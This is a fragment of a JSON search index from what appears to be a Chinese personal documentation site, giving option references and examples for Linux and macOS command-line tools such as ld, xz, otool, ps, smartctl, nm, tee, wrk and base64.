当一个通用符号和另一个通用符号结合时发出警告 -w arn-constructors 如果没有使用任何全局构造器，则发出警告 -w arn-once 对于每个未定义的符号只发出一次警告 -w arn-section-align 如果为了对齐而改动了输出段地址，则发出警告 --whole-archive 对于指定的存档文件，在存档中包含所有文件 -X , --discard-locals 删除所有本地临时符号 -x , --discard-al 删除所有本地符号 其他: -Map <mapfile>: 将链接映射输出到指定的文件 -rpath=<dir> 设置运行时共享库的搜索路径 -rpath-link=<dir> 设置链接时共享库的搜索路径 -split-by-file[=size] 为每个目标文件在输出文件中创建额外的段大小达到size。size默认为1 -split-by-reloc[=count] 按照指定的长度在输出文件中创建额外的段 --section-start=<sectionname>=<org> 在输出文件中指定的地址定位指定的段 -T <scriptfile>, --script=<scriptfile> 使用 scriptfile 作为链接器脚本。此脚本将替换 ld 的默认链接器脚本（而不是添加到其中），因此脚本必须指定输出文件所需的所有内容。如果当前目录中不存在脚本文件，ld 会在 -L 选项指定的目录中查找 -Ttext=<org> 使用指定的地址作为文本段的起始点 -Tdata=<org> 使用指定的地址作为数据段的起始点 -Tbss=<org> 使用指定的地址作为bss段的起始点","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-London.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-London.html"},{"title":"xz","text":"高压缩率的工具, 使用 LZMA2 压缩算法， 生成的压缩文件比 POSIX 平台传统使用的 gzip、bzip2 生成的压缩文件更小， 而且解压缩速度也很快，压缩或解压缩xz文件 语法: xz [OPTION]... [FILE]... 参数: -z , --compress 强制压缩 -d , --decompress , --uncompress force decompression, 解压 -t , --test 测试压缩文件的完整性 -l , --list 列出有关.xz文件的信息 -k , --keep 保留（不要删除）输入文件 -f , --force 强制覆盖输出文件和（解）压缩链接 -c , --stdout , --to-stdout 写入标准输出，不要删除输入文件 使用7-9之前解压缩内存使用量考虑在内！ -e , --extreme 尝试通过使用更多的CPU时间来提高压缩比; 要求不影响解压缩存储器 -q , --quiet 抑制警告; 指定两次以抑制错误 -v , --verbose 冗长; 指定两次更详细 -h , --help 显示这个简洁的帮助并退出 -H , --long-help 显示更多帮助（还列出了高级选项） -V , --version 显示版本号并退出s -T , --threads= <NUM> 最多使用NUM个线程; 默认值为1; set to 0 设置为0，使用与处理器内核一样多的线程 -0 ... -9 压缩预设; 默认为6; 取压缩机*和*","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Now.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Now.html"},{"title":"otool","text":"mac下指令, 类似linux的 /docs/操作系统/linux/linux指令/ldd 如查看vim的链接: otool -L /usr/bin/vim -f print the fat headers -a print the archive header -h print the mach header -l print the load commands -L print shared libraries used -D print shared library id name -t print the text section (disassemble with -v) -p <routine name> start dissassemble from routine name -s <segname sectname> print contents of section -d print the data section -o print the Objective-C segment -r print the relocation entries -S print the table of contents of a library -T print the table of contents of a dynamic shared library -M print the module table of a dynamic shared library -R print the reference table of a dynamic shared library -I print the indirect symbol table -H print the two-level hints table -G print the data in code table -v print verbosely (symbolically) when possible -V print disassembled operands symbolically -c print argument strings of a core file -X print no leading addresses or headers -m don't use archive(member) syntax -B force Thumb disassembly (ARM objects only) -q use llvm's disassembler (the default) -Q use otool(1)'s disassembler -j print opcode bytes -C print linker optimization hints 其他: -mcpu=<arg> use `arg' as the cpu for disassembly –version print the version of otool","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-OTOOL-(MAC).html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-OTOOL-(MAC).html"},{"title":"ps","text":"用于报告当前系统的进程状态. 可以搭配kill指令随时中断、删除不必要的程序。 ps命令是最基本同时也是非常强大的进程查看命令， 使用该命令可以确定有哪些进程正在运行和运行的状态、 进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等， 总之大部分信息都是可以通过执行该命令得到. 选项: -a 显示所有终端机下执行的程序，除了阶段作业领导者之外。 a 显示现行终端机下的所有程序，包括其他用户的程序。 -A 显示所有程序。 -c 显示CLS和PRI栏位。 c 列出程序时，显示每个程序真正的指令名称，而不包含路径，选项或常驻服务的标示。 -C<指令名称> 指定执行指令的名称，并列出该指令的程序的状况。 -d 显示所有程序，但不包括阶段作业领导者的程序。 -e 此选项的效果和指定\"A\"选项相同。 e 列出程序时，显示每个程序所使用的环境变量。 -f 显示UID,PPIP,C与STIME栏位。 f 用ASCII字符显示树状结构，表达程序间的相互关系。 -g<群组名称> 此选项的效果和指定\"-G\"选项相同，当亦能使用阶段作业领导者的名称来指定。 g 显示现行终端机下的所有程序，包括群组领导者的程序。 -G<群组识别码> 列出属于该群组的程序的状况，也可使用群组名称来指定。 h 不显示标题列。 -H 显示树状结构，表示程序间的相互关系。 -j或j 采用工作控制的格式显示程序状况。 -l或l 采用详细的格式来显示程序状况。 L 列出栏位的相关信息。 -m或m 显示所有的执行绪。 n 以数字来表示USER和WCHAN栏位。 -N 显示所有的程序，除了执行ps指令终端机下的程序之外。 -p<程序识别码> 指定程序识别码，并列出该程序的状况。 p<程序识别码> 此选项的效果和指定\"-p\"选项相同，只在列表格式方面稍有差异。 r 只列出现行终端机正在执行中的程序。 -s<阶段作业> 指定阶段作业的程序识别码，并列出隶属该阶段作业的程序的状况。 s 采用程序信号的格式显示程序状况。 S 列出程序时，包括已中断的子程序资料。 -t<终端机编号> 指定终端机编号，并列出属于该终端机的程序的状况。 t<终端机编号> 此选项的效果和指定\"-t\"选项相同，只在列表格式方面稍有差异。 -T 显示现行终端机下的所有程序。 -u<用户识别码> 此选项的效果和指定\"-U\"选项相同。 u 以用户为主的格式来显示程序状况。 -U<用户识别码> 列出属于该用户的程序的状况，也可使用用户名称来指定。 U<用户名称> 列出属于该用户的程序的状况。 v 采用虚拟内存的格式显示程序状况。 x 显示所有程序，不以终端机来区分。 X 采用旧式的Linux i386登陆格式显示程序状况。 关于ps 的 stat状态解释 状态说明: X 死掉的进程（未开启） < 高优先级 N 低优先级 L 有些页被锁进内存，有记忆体的分页分配并锁在记忆体内 s 包含子进程，某一个会话的Leader进程 \\+ 位于后台的进程组，属于某个前台组的进程 l 多线程，克隆线程 multi-threaded (using CLONE_THREAD, like NPTL pthreads do) WCHAN 正在等待的进程资源 D 不可中断的进程，不可中断睡眠（通常是在IO操作）收到信号不唤醒和不可运行，进程必须等待直到有中断发生 R 正在执行中，正在运行或可运行（在运行队列排队中） S 静止状态，可中断睡眠（休眠中，受阻，在等待某个条件的形成或接受到信号） T 暂停执行 Z 僵尸进程，进程已终止，但进程描述符存在，直到父进程调用wait4()系统调用后释放 W 没有足够的记忆体分页可分配 ，正在换页（2.6内核之前有效） 注解 关于grep搜索进程时, 排出自身, 见 GrepExclude","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PS.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PS.html"},{"title":"pwd","text":"print working directory 显示当前路径 -P 显示真实路径 而非链接路径","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PWD.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PWD.html"},{"title":"poweroff","text":"poweroff 会发送一个 ACPI 信号来通知系统关机: # poweroff ### 关闭机器、关闭电源 # poweroff --halt ### 停止机器 # poweroff --reboot ### 重启机器","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Poweroff.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Poweroff.html"},{"title":"readelf","text":"参考: elf文件说明及介绍: https://zhuanlan.zhihu.com/p/112754720 https://www.jianshu.com/p/0599d846e1df https://zhuanlan.zhihu.com/p/30516267 用于显示 elf 格式文件的信息。 语法: readelf elf-file(s) readelf 用来显示一个或者多个 elf 格式的目标文件的信息， 可以通过它的选项来控制显示哪些信息。这里的 elf-file(s) 就表示那些被检查的文件。 可以支持32位，64位的 elf 格式文件，也支持包含 elf 文件的文档 （这里一般指的是使用 ar 命令将一些 elf 文件打包之后生成的例如 lib*.a 之类的\"静态库\"文件）。 与 /docs/操作系统/linux/linux指令/objdump 有点类似 选项(常用): -a 显示so文件所以信息 -h ELF文件头 -l program-headers 静态加载分析时需要的信息 -S section-headers 静态加载分析时需要的信息 -e 头信息，elf header，section header，program header -s 显示符号表 -d 显示动态节","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Readel.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Readel.html"},{"title":"smartctl","text":"功能 smartctl 工具用来实现操作系统上的 ATA/SATA 、SCSI/SAS、SSD 等物理设备的监控、分析及使用情况报告。 SMART 指的是对硬盘等设备的可靠性监控及预测磁盘可能存在的故障，并根据硬盘形态进行不同程度的自检。 smartctl 的版本可以兼容众多磁盘规范，例如 ACS-2、ATA8-ACS、ATA/ATAPI-7 及更早期的一些磁盘标准。 注解 大多发行版已经内置, 若没有, 可手动安装: apt install smartmontools smartmontools 提供了两种使用模式 以服务模式运行: 通过 smartd 服务及配置文件来对服务器上的磁盘按照规则进行自检，需要开启 smartd.service 服务 以命令行模式运行: 以终端命令行的方式对磁盘进行自检，无需开启 smartd 服务 注解 Mac可通过: brew install smartmontools 来安装, 并查看固态寿命 选项参数 基本命令参数选项(部分) 选项 说明 -h, --help, --usage Display this help and exit -V, --version, --copyright, --license Print license, copyright, and version information and exit -i, --info 显示设备基本信息 --identify[=[w][nvb]] Show words and bits from IDENTIFY DEVICE data (ATA) -g NAME, --get=NAME Get device setting. all, aam, apm, dsn, lookahead, security, wcache, rcache, wcreorder, wcache-sct -a, --all Show all SMART information for device -x, --xall Show all information for device --scan 查看系统所有设备 --scan-open Scan for devices and try to open each device -H, --health 检查健康状态 -t TEST, --test=TEST Run test. TEST. offline, short, long, conveyance, force, vendor,N, select,M-N, pending,N, afterselect,[on|off] -a 输出信息说明 严重警告（Critical Warning） 会显示控制器状态警告讯息，如果都显示0x00 就表示没事 温度（Temperature） 会显示当前SSD 温度资讯 可用备用空间（Available Spare） SSD 剩余空间百分比 可用备用临界值（Available Spare Threshold） 临界值全由厂商定义 寿命百分比（Percentage Used） 目前SSD 寿命百分比数值，具体取决于实际设备使用情况和厂商对设备寿命的预测。 资料读取（Data Units Read） 记录电脑从SSD读取512字节数据单元的总量，每1000个单元记录一次，即这项Raw数据1的值等于500KB。 资料写入（Data Units Read） 如上，就是写入总量。 主机读取命令（Host Read Commands） 主控收到的读取命令数量。 主机写入命令（Host Write Commands） 主控收到的写入命令数量。 控制器忙碌时间（Controller Busy Time） 主控忙于I/O命令的时间。 意外关机（Unsafe Shutdowns） 纪录不正常断电次数 媒体和资料完整性错误（Media and Data Integrity Errors） 主控检测得到的未恢复的数据完整性错误次数。 错误资料纪录（Number of Error Information Log Entries） 主控总共收到的错误信息日志数量。 示例 # 检查磁盘健康状态 smartctl -H /dev/sda # 然后查看磁盘详细情况 smartctl -a /dev/sda # 再对磁盘进行短期测试 smartctl -t short /dev/sda # 查看磁盘测试结果, 基本磁盘健康状态就可以定位出来 smartctl -l selftest /dev/sda # 最后检查磁盘错误日志 smartctl -l error /dev/sdb","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SmartCTL.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SmartCTL.html"},{"title":"nm","text":"linux下自带的特定文件分析工具， 一般用来检查分析二进制文件、库文件、可执行文件中的符号表，返回二进制文件中各段的信息。 目标文件、库文件、可执行文件 首先，提到这三种文件，我们不得不提的就是gcc的编译流程：预编译，编译，汇编，链接。 目标文件 常说的目标文件是我们的程序文件(.c/.cpp,.h)经过 预编译，编译，汇编过程生成的二进制文件,不经过链接过程，编译生成指令为: gcc(g++) -c file.c(file.cpp) 将生成对应的file.o文件,file.o即为二进制文件 库文件 分为静态库和动态库，这里不做过多介绍，库文件是由多个二进制文件打包而成，生成的.a文件， 示例: ar -rsc liba.a test1.o test2.o test3.o 将test1.o test2.o test3.o三个文件打包成liba.a库文件 可执行文件 可执行文件是由多个二进制文件或者库文件(由上所得，库文件其实是二进制文件的集合) 经过链接过程生成的一个可执行文件，对应windows下的.exe文件， 可执行文件中有且仅有一个main()函数(用户程序入口，一般由bootloader指定，当然也可以改)， 一般情况下，二进制文件和库文件中是不包含main()函数的， 但是在linux下用户有绝对的自由，做一个包含main函数的库文件也是可以使用的, 但这不属于常规操作，不作讨论。 上述三种文件的格式都是二进制文件。 为什么要用到nm 在上述提到的三种文件中，用编辑器是无法查看其内容的(乱码)， 所以当我们有这个需求(例如debug，查看内存分布的时候) 去查看一个二进制文件里包含了哪些内容时，这时候就将用到一些特殊工具， linux下的nm命令就可以完全胜任(同时还有objdump和readelf工具，这里暂不作讨论)。 nm的常用命令参数 -A , -o , --print-file-name 打印出每个符号属于的文件 -a , --debug-syms 打印出所有符号，包括debug符号 -B BSD码显示 -C, --demangle[=style] 对低级符号名称进行解码， C++文件需要添加(不然看C++编译好的内容就是编码的) --no-demangle 不对低级符号名称进行解码，默认参数 -D , --dynamic 显示动态符号而不显示普通符号，一般用于动态库 -f format , --format= format 显示的形式，默认为bsd，可选为sysv和posix -g , --extern-only 仅显示外部符号 -h , --help 国际惯例，显示命令的帮助信息 -n , -v , --numeric-sort 显示的符号以地址排序，而不是名称排序 -p , --no-sort 不对显示内容进行排序 -P , --portability 使用POSIX.2标准 -V , --version 国际管理，查看版本 --defined-only 仅显示定义的符号(Display only defined symbols for each object file) 对-C解码C++的说明 比如源码定义了add函数: int add(int a, int b){return a+b;} 编译为动态库文件(Mac下不知道为什么像是个假的动态库, 因为没有动态库符号表): g++ -std=c++11 -dynamiclib -o libtest2.dylib test2.cpp 然后 nm不带C查看: $ nm -n libtest2.dylib 0000000000003d80 T __Z3addii nm带C查看: $ nm -n -C libtest2.dylib 0000000000003d80 T add(int, int) 关于输出数据的说明 以上为例: 0000000000003d80 T add(int, int) 第一列: 偏移地址 第二列: 当前条目所对应的内存所在部分 第三列: 符号内容 字符所对应的含义: A ：符号的值是绝对值，不会被更改 B或b ：未被初始化的全局数据，放在.bss段 D或d ：已经初始化的全局数据 G或g ：指被初始化的数据，特指small objects I ：另一个符号的间接参考 N ：debugging 符号 p ：位于堆栈展开部分 R或r ：属于只读存储区 S或s ：指为初始化的全局数据，特指small objects T或t ：代码段的数据，.test段 U ：符号未定义 W或w ：符号为弱符号，当系统有定义符号时，使用定义符号，当系统未定义符号且定义了弱符号时，使用弱符号。 ？ ：unknown符号 参考: linux下强大的文件分析工具 -- nm 关于符号表说明 主要是针对C++文件的编译 以下面数据为例 源码为: int add(int a, int b){ int tmp = a + 3; return tmp + b; } extern \"C\"{ int add2(int a, int b){ return a+b+10;} } extern \"C\" 表示使用C标准导出函数, 意思是不会对函数名称进行修饰 编译指令: g++ -std=c++11 -dynamiclib -g -o libtest2.dylib test2.cpp 使用nm查看信息: $ nm -n -U libtest2.dylib 0000000000003d60 T __Z3addii 0000000000003d80 T _add2 对其进行解码: $ nm -n -CU libtest2.dylib 0000000000003d60 T add(int, int) 0000000000003d80 T _add2 如果要在其他地方进行提取, 如: // 定义原始函数指针类型 typedef int (*OrigAddFunc)(int a, int b); // 定义全局变量存储原始函数指针 OrigAddFunc origAdd = NULL; void* handle = dlopen(\"./libtest2.dylib\", RTLD_LAZY); if (handle == NULL) { printf(\"无法打开当前可执行文件\\n, info: %s\\n\", dlerror()); return 1; } origAdd = (OrigAddFunc)dlsym(handle, \"_Z3addii\"); if (origAdd == NULL) { printf(\"无法获取原始函数地址\\n, info: %s\\n\", dlerror()); dlclose(handle); return 1; } 主要是 (OrigAddFunc)dlsym(handle, \"_Z3addii\"); , dlsym是针对库文件的函数名进行寻找, C++默认会进行函数名修士, 所以如果要找 add 函数, 得先用 nm 找出修饰后的名称 _Z3addii (输出去掉下划线), 使用解析后的是不行的 如果是 add2, 源码已经用 extern \"C\" 指定使用C标准导出, 就可直接 dlsym(handle, \"add2\")","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-So.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-So.html"},{"title":"su","text":"用户切换 用法: su [options] [-] [<user> [<argument>...]] -l 或者直接 - , 表示使用登录shell, 可以完全加载指定用户的环境 注解 这里简单提一下与 /docs/操作系统/linux/linux指令/sudo 相关的, sudo -i 也可以切换到root用户, 不过切换过去后只是加载root到环境变量, 并不是完全加载环境. 且执行的命令默认会有日志记录在 /var/log/sudo/ , 便于审计, 更安全.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Sovereign.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Sovereign.html"},{"title":"tee","text":"读取标准输入的数据，并将其内容输出成文件(同时输出到终端与文件)。 语法: tee [-ai][--help][--version][文件...] 参数 -a,--append 附加到既有文件的后面，而非覆盖它． -i,--ignore-interrupts 忽略中断信号。 --help 在线帮助。 --version 显示版本信息。 实例 将 ls 的结果同时输出到屏幕与文件: ┌──(yanque㉿3675b5ebb8ce)-[~/test] └─$ ls -lh total 8.0K -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file1 -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file2 ┌──(yanque㉿3675b5ebb8ce)-[~/test] └─$ ls -lh | tee t.log total 8.0K -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file1 -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file2 -rw-r--r-- 1 yanque yanque 0 Feb 25 06:43 t.log ┌──(yanque㉿3675b5ebb8ce)-[~/test] └─$ cat t.log total 8.0K -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file1 -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file2 -rw-r--r-- 1 yanque yanque 0 Feb 25 06:43 t.log 注解 如果只是使用 tee, 会打开一个交互窗口, 在里面输入需要写入的内容, 退出直接 ctrl + c 即可","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TEE.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TEE.html"},{"title":"tput","text":"功能 tput 命令会利用 terminfo 数据库中的信息，来控制和更改我们的终端，比如控制光标、更改文本属性、控制屏幕，以及为文本涂色。 其中，为文本涂色的方法是: tput setab <color_int>：用于设置背景色 tput setaf <color_int>：用于设置前景色 tput sgr0：表示颜色重置 数值定义如下 数值 含义 0 黑 1 红 2 绿 3 黄 4 蓝 5 洋红 6 黄 7 白","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TPUT.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TPUT.html"},{"title":"ttyrec","text":"与 /docs/操作系统/linux/linux指令/script , /docs/操作系统/linux/linux指令/asciinema 类似, 是 ttygif 配套的工具, 用于录制 text/x-script 文件 text/x-script 文件: 保存了终端某段时间的执行情况, 可用户复现, 比如生成gif图(需要使用ttygif) 安装: 与 ttygif 安装一致, 装好 ttygif 默认会带上 ttyrec","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TTYRC.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TTYRC.html"},{"title":"wrk","text":"轻量级性能压测工具 可以用来测试接口的性能如何, 吞吐量能达到多少, QPS（Query per second 每秒处理完的请求数） 能达到多少呢 介绍 wrk 是一款针对 Http 协议的基准测试工具，它能够在单机多核 CPU 的条件下， 使用系统自带的高性能 I/O 机制， 如 epoll，kqueue 等，通过多线程和事件模式，对目标机器产生大量的负载。 注解 wrk 是复用了 redis 的 ae 异步事件驱动框架， 准确来说 ae 事件驱动框架并不是 redis 发明的, 它来至于 Tcl 的解释器 jim, 这个小巧高效的框架, 因为被 redis 采用而被大家所熟知。 优势 轻量级性能测试工具; 安装简单（相对 Apache ab 来说）; 学习曲线基本为零，几分钟就能学会咋用了； 基于系统自带的高性能 I/O 机制， 如 epoll, kqueue, 利用异步的事件驱动框架， 通过很少的线程就可以压出很大的并发量； 劣势 wrk 目前仅支持单机压测，后续也不太可能支持多机器对目标机压测， 因为它本身的定位，并不是用来取代 JMeter, LoadRunner 等专业的测试工具， wrk 提供的功能，对我们后端开发人员来说，应付日常接口性能验证还是比较友好的。 安装 wrk 只能被安装在类 Unix 系统上，所以我们需要一个 Linux 或者 MacOS 环境。 Windows 10 安装需要开启自带的 Ubuntu 子系统。 对于Debian: sudo apt-get install build-essential libssl-dev git -y git clone https://github.com/wg/wrk.git wrk cd wrk make # 将可执行文件移动到 /usr/local/bin 位置 sudo cp wrk /usr/local/bin 对于RedHat: sudo yum groupinstall 'Development Tools' sudo yum install -y openssl-devel git git clone https://github.com/wg/wrk.git wrk cd wrk make # 将可执行文件移动到 /usr/local/bin 位置 sudo cp wrk /usr/local/bin 对于MacOS: brew install wrk 对于Windows: Windown 10 需要在 Windows 功能 里勾选 适用于 Linux 的 Windows 子系统, 然后通过 bash 命令切换到 Ubuntu 子系统。 参考上面. 使用-语法 语法: wrk <选项> <被测HTTP服务的URL> Options: -c , --connections <N> 跟服务器建立并保持的TCP连接数量 -d , --duration <T> 压测时间 -t , --threads <N> 使用多少个线程进行压测 -s , --script <S> 指定Lua脚本路径 -H , --header <H> 为每一个HTTP请求添加HTTP头 --latency 在压测结束后，打印延迟统计信息 --timeout <T> 超时时间 -v , --version 打印正在使用的wrk的详细版本信息 <N>代表数字参数，支持国际单位 (1k, 1M, 1G) <T>代表时间参数，支持时间单位 (2s, 2m, 2h) 注解 关于线程数，并不是设置的越大，压测效果越好，线程设置过大， 反而会导致线程切换过于频繁，效果降低， 一般来说，推荐设置成压测机器 CPU 核心数的 2 倍到 4 倍就行了。 对 www.baidu.com 发起压力测试， 线程数为 12，模拟 400 个并发请求，持续 30 秒: wrk -t12 -c400 -d30s http://www.baidu.com 测试报告 还是上面的对 www.baidu.com 发起压力测试， 线程数为 12，模拟 400 个并发请求，持续 30 秒 并打印延迟报告: $ wrk -t12 -c400 -d30s --latency http://www.baidu.com Running 30s test @ http://www.baidu.com 12 threads and 400 connections (共12个测试线程，400个连接) (平均值) (标准差)（最大值）(正负一个标准差所占比例) Thread Stats Avg Stdev Max +/- Stdev (延迟) Latency 1.44s 483.77ms 2.00s 76.01% (每秒请求数) Req/Sec 14.70 11.35 90.00 74.57% Latency Distribution (延迟分布) 50% 1.58s 75% 1.79s 90% 1.92s 99% 1.99s 3967 requests in 30.11s, 1.55GB read (30.11s内处理了 3967 个请求，耗费流量1.55GB) Socket errors: connect 158, read 0, write 0, timeout 1191 (发生错误数) Requests/sec: 131.77 (QPS 131.77,即平均每秒处理请求数为131.77) Transfer/sec: 52.60MB (平均每秒流量52.60MB) 注解 标准差啥意思？标准差如果太大说明样本本身离散程度比较高，有可能系统性能波动较大。 复杂测试 通过编写 Lua 脚本的方式，在运行压测命令时，通过参数 --script 来指定 Lua 脚本 提供的函数 function setup(thread) setup 函数在目标 IP 地址已经解析完, 并且所有 thread 已经生成, 但是还没有开始时被调用. 每个线程执行一次这个函数. setup 方法中可操作该 thread 对象，获取信息、存储信息、甚至关闭该线程: thread.addr - get or set the thread's server address thread:get(name) - get the value of a global in the thread's env thread:set(name, value) - set the value of a global in the thread's env thread:stop() - stop the thread function init(args) init 函数每次请求发送之前被调用. 可以接受 wrk 命令行的额外参数. 通过 -- 指定. function delay() delay函数返回一个数值, 在这次请求执行完以后延迟多长时间执行下一个请求. 可以对应 thinking time 的场景. function request() request函数可以每次请求之前修改本次请求的属性. 返回一个字符串. 这个函数要慎用, 会影响测试端性能. function response(status, headers, body) response函数每次请求返回以后被调用. 可以根据响应内容做特殊处理, 比如遇到特殊响应停止执行测试, 或输出到控制台等等. function done(summary, latency, requests) done函数在所有请求执行完以后调用, 一般用于自定义统计结果. wrk官网提供的setup.lua实例: -- example script that demonstrates use of setup() to pass -- data to and from the threads local counter = 1 local threads = {} function setup(thread) thread:set(\"id\", counter) table.insert(threads, thread) counter = counter + 1 end function init(args) requests = 0 responses = 0 local msg = \"thread %d created\" print(msg:format(id)) end function request() requests = requests + 1 return wrk.request() end function response(status, headers, body) responses = responses + 1 end function done(summary, latency, requests) for index, thread in ipairs(threads) do local id = thread:get(\"id\") local requests = thread:get(\"requests\") local responses = thread:get(\"responses\") local msg = \"thread %d made %d requests and got %d responses\" print(msg:format(id, requests, responses)) end end 参考:: 性能测试工具 wrk 使用教程 HTTP压测工具之wrk","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-WRK.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-WRK.html"},{"title":"zenity","text":"Zenity是一个使用GTK+库开发的工具，用于创建图形用户界面（GUI）对话框(信息框) 一般 GNOME 桌面系统会预装. GNOME 是一个基于 GTK+ 的桌面环境. 由于 zenity 与 GNOME 密切相关，因此大多数基于GNOME的Linux发行版， 包括Ubuntu、Fedora和Debian等，都会默认安装Zenity。 安装: apt install zenity 常用选项: --info 信息框 --width <num> 弹出框宽度 --title <str> 标题 --text 主区域文本 --window-icon <icon_file> 设置窗体图标 如弹出宽500的信息框: zenity --info --title \"标题\" --text \"文本\" --width=500","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Zenity.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Zenity.html"},{"title":"asciinema","text":"与 /docs/操作系统/linux/linux指令/script 类似 终端脚本录制工具, 支持多种方式安装, pip安装: pip install asciinema debian/ubuntu使用apt安装: apt install asciinema 终端执行的录制 开始录制: asciinema rec 然后像平常一样使用即可, 会自动被记录 结束录制(也可以不用 exit 而是直接 Ctrl+D ): exit 根据提示可选择上传或者保存到本地, 一般输出为 .cast 文件 (貌似)","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-asciinema.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-asciinema.html"},{"title":"base64","text":"一些命令 从 file 中读取字符串然后编码: base64 file 将字符串 string+换行 编码为base64的字符串: echo \"string\" | base64 将字符串 string 编码为base64的字符串: echo -n \"string\" | base64 从指定的文件file中读取已经过base64编码的数据，然后进行解码: base64 -d file 对base64编码的字符串 str和空行 进行解码: echo \"str\" | base64 -d 对base64编码的字符串str进行解码: echo -n \"str\" | base64 -d 编/解码过程解析 例子: 转换前: 10101101,10111010,01110110 转换后: 00101011, 00011011 ,00101001 ,00110110 十进制: 43 27 41 54 对应码表中的值: r b p 2 所以上面的24位编码，编码后的Base64值为: rbp2 解码同理，把 rbq2 的二进制位连接上再重组得到三个8位值，得出原码。 （解码只是编码的逆过程，有关MIME的RFC还有很多，如果需要详细情况请自行查找。） 过程： 第一个字节，根据源字节的第一个字节处理。 规则：源第一字节右移两位，去掉低2位，高2位补零。 既：00 + 高6位 第二个字节，根据源字节的第一个字节和第二个字节联合处理。 规则如下，第一个字节高6位去掉然后左移四位，第二个字节右移四位 即：源第一字节低2位 + 源第2字节高4位 第三个字节，根据源字节的第二个字节和第三个字节联合处理， 规则第二个字节去掉高4位并左移两位（得高6位），第三个字节右移6位并去掉高6位（得低2位），相加即可 第四个字节，规则，源第三字节去掉高2位即可 用更接近于编程的思维来说，编码的过程是这样的： 第一个字符通过右移2位获得第一个目标字符的Base64表位置，根据这个数值取到表上相应的字符，就是第一个目标字符。 然后将第一个字符与0x03(00000011)进行与(&)操作并左移4位,接着第二个字符右移4位与前者相或(|)，即获得第二个目标字符。 再将第二个字符与0x0f(00001111)进行与(&)操作并左移2位,接着第三个字符右移6位与前者相或(|)，获得第三个目标字符。 最后将第三个字符与0x3f(00111111)进行与(&)操作即获得第四个目标字符。 在以上的每一个步骤之后，再把结果与 0x3F 进行 AND 位操作 ， 就可以得到编码后的字符了。 原文的字节数量应该是3的倍数，如果这个条件不能满足的话，具体的解决办法是这样的：原文剩余的字节根据编码规则继续单独转(1变2，2变3；不够的位数用0补全)，再用=号补满4个字节。这就是为什么有些Base64编码会以一个或两个等号结束的原因，但等号最多只有两个。因为一个原字节至少会变成两个目标字节，所以余数任何情况下都只可能是0，1，2这三个数中的一个。如果余数是0的话，就表示原文字节数正好是3的倍数（最理想的情况）。如果是1的话，转成2个Base64编码字符，为了让Base64编码是4的倍数，就要补2个等号；同理，如果是2的话，就要补1个等号。 原理：三个字节的八个字符 = 四个字节的六个字符 （3*8=4*6） 流程： 1、将字符转为ascii 2、将ascii转为二进制 3、原有的三字节在这里以源一、二、三代表 转换后的第一个字节：00 + 源一的高六位字符 转换后的第二个字节：00 + 源一的低二位字符 + 源二的高四位字符 转换后的第三个字节：00 + 源二的低四位字符 + 源三的高二位字符 转换后的第四个字节：00 + 源三的低六位字符 4、转换的二进制转换为十进制，根据编码表编码 注意：转换后的编码默认每76个字符换行，若不需换行，shell中 base64 -w 0即可 常用: base64 #编码 base64 -w num #指定以多少个字符换行，为0则并不换行 base64 -d #解码 编码表 索引 对应字符 索引 对应字符 索引 对应字符 索引 对应字符 0 A 17 R 34 i 51 z 1 B 18 S 35 j 52 0 2 C 19 T 36 k 53 1 3 D 20 U 37 l 54 2 4 E 21 V 38 m 55 3 5 F 22 W 39 n 56 4 6 G 23 X 40 o 57 5 7 H 24 Y 41 p 58 6 8 I 25 Z 42 q 59 7 9 J 26 a 43 r 60 8 10 K 27 b 44 s 61 9 11 L 28 c 45 t 62 12 M 29 d 46 u 63 / 13 N 30 e 47 v 14 O 31 f 48 w 15 P 32 g 49 x 16 Q 33 h 50 y","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-base64.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-base64.html"},{"title":"bash","text":"-n 仅语法检查 -v 执行前，先将内容输出（详细输出执行过程） -x 将使用的脚本内容显示到屏幕 